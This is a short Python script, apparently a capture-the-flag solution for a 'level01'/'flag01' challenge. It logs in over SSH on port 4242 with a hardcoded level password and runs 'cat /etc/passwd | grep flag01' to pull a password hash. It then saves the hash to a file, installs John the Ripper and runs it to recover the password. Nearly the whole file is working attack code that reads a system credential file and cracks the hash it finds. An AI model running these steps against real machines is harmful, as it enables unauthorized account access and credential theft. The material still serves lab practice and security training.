"""
    This script recovery password from hash
    with help of Jonny the Ripper.
"""

from os import path, system
import paramiko

host = input("\033[92mEnter IP address of remote machine and press Return:\033[0m")
username = 'level01'
password = 'x24ti5gi3x0ol2eh4esiuxias'

ssh = paramiko.SSHClient()
if ssh is not None:
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host,username=username,password=password,port=4242)
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('cat /etc/passwd | grep flag01')
    
    Hash = ssh_stdout.readlines()
    print("\033[95m", '\n', f"Hash solution:",  
            '\033[96m' ,Hash[0], 'Here it is! Just need some hack!', '\033[0m')

    del ssh_stdin, ssh_stdout, ssh_stderr
    ssh.close()
    
    with open("hash.txt",'w') as fd:
        fd.write(Hash[0])
    
    system('brew install john')
    # system('john hash.txt')
    system('john --show hash.txt')

    

    